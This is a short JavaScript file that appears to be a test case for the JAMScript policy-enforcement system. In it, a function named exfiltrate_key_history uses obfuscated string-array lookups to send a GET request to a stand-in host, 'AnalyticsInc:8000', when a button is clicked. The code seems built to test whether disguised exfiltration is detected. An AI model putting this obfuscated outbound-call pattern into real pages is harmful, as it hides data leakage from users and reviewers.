function exfiltrate_key_history() {
  var _0x2e14 = ["GET", "http://AnalyticsInc:8000/submission.html?", "test=java_obfuscator", "open", "send"];
  xmlhttp = new XMLHttpRequest;
  var v0 = _0x2e14[3];
  var v1 = _0x2e14[0];
  var v5 = _0x2e14[1];
  var v6 = _0x2e14[2];
  var v2 = v5 + v6;
  introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
    var v7 = [[v1, v2, true], xmlhttp, xmlhttp[v0]]
  }
  JAMScript.call(v7[2], v7[1], v7[0]);
  var v3 = _0x2e14[4];
  introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
    var v8 = [[null], xmlhttp, xmlhttp[v3]]
  }
  JAMScript.call(v8[2], v8[1], v8[0]);
  return
}
var v4 = document.getElementById("test");
JAMScript.set(v4, "onclick", exfiltrate_key_history);

